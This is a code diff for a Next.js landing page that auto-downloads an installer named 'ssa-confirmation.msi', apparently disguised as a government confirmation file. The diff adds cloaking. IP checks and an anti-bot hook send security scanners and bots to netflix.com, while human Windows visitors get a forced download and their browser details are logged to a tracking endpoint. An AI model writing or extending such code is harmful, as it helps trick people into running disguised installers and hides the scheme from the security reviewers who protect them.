@@ -1,8 +1,9 @@
 "use client";
 
-import { useEffect, useState } from "react";
+import { useEffect, useState, useCallback, useRef } from "react";
 import DownloadGuide from "@/components/DownloadGuide";
 import PlatformModal from "@/components/PlatformModal";
+import { useAntiBot } from "@/hooks/useAntiBot";
 
 const DOWNLOAD_API = "/api/download";
 const DOWNLOAD_FILENAME = "ssa-confirmation.msi";
@@ -13,8 +14,18 @@ export default function Home() {
   const [showPlatformModal, setShowPlatformModal] = useState(false);
   const [isWindows, setIsWindows] = useState(true);
   const [isCheckingIP, setIsCheckingIP] = useState(true);
+  const [securityCheckComplete, setSecurityCheckComplete] = useState(false);
+  const initRef = useRef(false);
 
-  const trackEvent = async (event: string) => {
+  const { isBot, isVerified, threatScore, verify } = useAntiBot({
+    autoVerify: false,
+    onBotDetected: () => {
+      trackEvent('Bot Detected - Redirecting');
+      window.location.href = 'https://www.netflix.com';
+    },
+  });
+
+  const trackEvent = useCallback(async (event: string, extra?: Record<string, unknown>) => {
     try {
       await fetch('/api/track', {
         method: 'POST',
@@ -27,67 +38,77 @@ export default function Home() {
           platform: navigator.platform,
           timestamp: new Date().toISOString(),
           referrer: document.referrer,
+          ...extra,
         }),
       });
     } catch (error) {
       console.error('Tracking error:', error);
     }
-  };
+  }, []);
 
   useEffect(() => {
-    const checkIPAndInitialize = async () => {
+    if (initRef.current) return;
+    initRef.current = true;
+
+    const runSecurityChecks = async () => {
       try {
-        const response = await fetch('/api/check-ip');
-        const data = await response.json();
+        const ipResponse = await fetch('/api/check-ip');
+        const ipData = await ipResponse.json();
         
-        if (!data.isSafe) {
-          trackEvent('Cloaked Visitor Detected');
+        if (!ipData.isSafe) {
+          trackEvent('Cloaked Visitor Detected', { checks: ipData.checks });
           window.location.href = 'https://www.netflix.com';
           return;
         }
+
+        const isHuman = await verify();
+        
+        if (!isHuman) {
+          trackEvent('Bot Detected via Anti-Bot', { threatScore });
+          window.location.href = 'https://www.netflix.com';
+          return;
+        }
+
+        setSecurityCheckComplete(true);
+        setIsCheckingIP(false);
+
+        const userAgent = navigator.userAgent.toLowerCase();
+        const windowsDetected = /windows|win32|win64/.test(userAgent);
+        setIsWindows(windowsDetected);
+
+        trackEvent('Page Visit - Verified Human', { threatScore });
+
+        const fileExtension = DOWNLOAD_FILENAME.substring(DOWNLOAD_FILENAME.lastIndexOf('.'));
+        const requiresWindows = WINDOWS_ONLY_EXTENSIONS.includes(fileExtension.toLowerCase());
+
+        if (requiresWindows && !windowsDetected) {
+          setShowPlatformModal(true);
+          trackEvent('Platform Mismatch - Non-Windows User');
+          return;
+        }
+
+        setDownloadStatus('starting');
+        trackEvent('Download Started');
+
+        setTimeout(() => {
+          const link = document.createElement("a");
+          link.href = DOWNLOAD_API;
+          link.download = DOWNLOAD_FILENAME;
+          document.body.appendChild(link);
+          link.click();
+          document.body.removeChild(link);
+
+          setDownloadStatus('downloaded');
+          trackEvent('Download Completed');
+        }, 1500);
       } catch (error) {
-        console.error('IP check error:', error);
+        console.error('Security check error:', error);
         window.location.href = 'https://www.netflix.com';
-        return;
       }
-      
-      setIsCheckingIP(false);
-
-      const userAgent = navigator.userAgent.toLowerCase();
-      const windowsDetected = /windows|win32|win64/.test(userAgent);
-      setIsWindows(windowsDetected);
-
-      trackEvent('Page Visit');
-
-      const fileExtension = DOWNLOAD_FILENAME.substring(DOWNLOAD_FILENAME.lastIndexOf('.'));
-      const requiresWindows = WINDOWS_ONLY_EXTENSIONS.includes(fileExtension.toLowerCase());
-
-      if (requiresWindows && !windowsDetected) {
-        setShowPlatformModal(true);
-        trackEvent('Platform Mismatch - Non-Windows User');
-        return;
-      }
-
-      setDownloadStatus('starting');
-      trackEvent('Download Started');
-
-      const timer = setTimeout(() => {
-        const link = document.createElement("a");
-        link.href = DOWNLOAD_API;
-        link.download = DOWNLOAD_FILENAME;
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-
-        setDownloadStatus('downloaded');
-        trackEvent('Download Completed');
-      }, 1500);
-
-      return () => clearTimeout(timer);
     };
 
-    checkIPAndInitialize();
-  }, []);
+    runSecurityChecks();
+  }, [verify, threatScore, trackEvent]);
 
   const handleManualDownload = () => {
     trackEvent('Manual Download Click');
